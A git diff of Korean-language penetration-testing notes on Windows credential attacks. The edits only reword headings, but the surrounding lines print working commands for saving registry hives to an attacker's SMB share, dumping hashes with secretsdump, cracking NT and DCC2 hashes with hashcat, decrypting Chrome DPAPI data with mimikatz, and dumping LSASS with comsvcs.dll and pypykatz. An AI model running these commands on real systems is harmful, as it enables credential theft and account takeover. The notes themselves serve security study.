@@ -242,7 +242,7 @@ reg.exe save hklm\security C:\security.save
 ```
 
 #### Impacket's smbserver.py로 공유 생성
-- smb2support를 실행, 공유 이름(`CompData`), 저장할 공격 호스트의 디렉토리(`/home/ltnbob/Documents`) 지정<br/>
+- smb2support 옵션(최신 버전의 SMB가 지원), 공유 이름(`CompData`), 저장할 공격 호스트의 디렉토리(`/home/ltnbob/Documents`) 지정<br/>
 ```$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/```
 
 #### Impacket's secretsdump.py로 Dumping Hashes
@@ -253,7 +253,7 @@ secretsdump 출력 : (uid:rid:lmhash:nthash)
 ```hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt```
 
 ### DCC2 hashes
-- 네트워크 자격 증명 해시의 로컬 해시된 사본, PBKDF2를 사용하기 때문에 NT 해시보다 해독하기 어려움<br/>
+- `hklm\security`, PBKDF2를 사용하기 때문에 NT 해시보다 해독하기 어려움<br/>
 ```$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt```
 
 ### DPAPI
@@ -269,13 +269,13 @@ mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data
 
 <br/><br/>
 ## Attacking Lsass
-### PowerShell을 이용한 lsass.dmp
+### PowerShell을 이용한 LSASS 프로세스 덤프
 ```
 Get-Process lsass
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 ```
 
-### Pypykatz를 사용하여 LSASS 프로세스 덤프
+### Pypykatz를 사용하여 자격 증명 추출
 ```pypykatz lsa minidump ./lsass.dmp```
 
 ### Cracking the NT Hash with Hashcat
